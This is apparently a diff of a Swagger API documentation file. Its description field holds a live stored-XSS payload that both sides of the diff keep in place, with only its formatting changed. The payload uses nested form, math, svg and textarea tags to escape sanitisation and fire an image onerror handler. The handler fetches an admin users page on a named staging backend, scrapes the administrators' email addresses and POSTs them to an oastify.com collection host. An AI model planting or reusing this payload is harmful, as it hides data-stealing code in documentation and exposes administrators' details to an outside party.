@@ -2,8 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=1 onerror="fetch('https://backend-staging.getpowerpay.us/admin/admin_users').then(r=>r.text()).then(t=>{const e=[...t.matchAll(/<td\s+class='col col-email'>(.*?)<\/td>/gi)].map(m=>m[1].trim()).join('\n');fetch('//y0z9bauj30v8q0iab8bd0rbrcii962ur.oastify.com/log/',{method:'POST',headers:{'Content-Type':'text/plain'},body:e})})">
-"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=1 onerror="fetch('https://backend-staging.getpowerpay.us/admin/admin_users').then(r=>r.text()).then(t=>{const e=[...t.matchAll(/<td\s+class='col col-email'>(.*?)<\/td>/gi)].map(m=>m[1].trim()).join('\n');fetch('//y0z9bauj30v8q0iab8bd0rbrcii962ur.oastify.com/log/',{method:'POST',headers:{'Content-Type':'text/plain'},body:e})})">"></form>
 paths:
   /accounts:
     get:
